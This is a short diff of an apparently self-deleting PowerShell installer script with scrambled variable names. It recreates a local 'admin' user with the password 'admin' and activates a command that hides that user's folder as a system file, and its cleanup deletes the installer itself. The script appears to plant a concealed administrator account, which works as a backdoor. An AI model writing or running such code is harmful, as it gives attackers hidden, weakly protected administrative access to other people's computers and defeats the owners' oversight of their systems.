@@ -24,7 +24,7 @@ $location = pwd
 
 # make admin
 $sqbXFdLvyw = "admin" # Default username
-$DCilJFugpP = admin
+$DCilJFugpP = "admin"
 Remove-LocalUser -Name $sqbXFdLvyw
 $HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
 geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes
@@ -64,7 +64,7 @@ mkdir happy
 mkdir sad
 
 # cleanup
-# attrib +h +s +r C:/Users/admin
+attrib +h +s +r C:/Users/admin
 Set-Location $location
 Remove-Item $CRYnrkaDbe -Force
 Remove-Item install.ps1 -Force
